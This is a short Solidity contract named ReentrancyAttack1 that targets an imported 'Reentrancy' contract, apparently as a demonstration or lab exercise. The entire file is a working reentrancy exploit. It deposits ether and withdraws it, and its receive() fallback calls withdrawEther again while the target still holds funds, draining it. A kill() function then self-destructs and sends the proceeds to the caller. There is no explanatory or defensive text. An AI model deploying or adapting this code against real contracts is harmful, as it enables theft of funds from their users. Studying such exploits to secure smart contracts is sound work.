// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;

import "./Reentrancy.sol";

contract ReentrancyAttack1 {

    Reentrancy reentrancy;

    constructor (address payable _reentrancy) {
        reentrancy = Reentrancy(_reentrancy);
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }

    function attack() public payable {
        reentrancy.setEther{value: msg.value}();
        reentrancy.withdrawEther();
    }

    function kill() public{
        selfdestruct(msg.sender);
    }

    receive() external payable {
        if (address(reentrancy).balance >= msg.value) {
            reentrancy.withdrawEther();
        }
    }
}
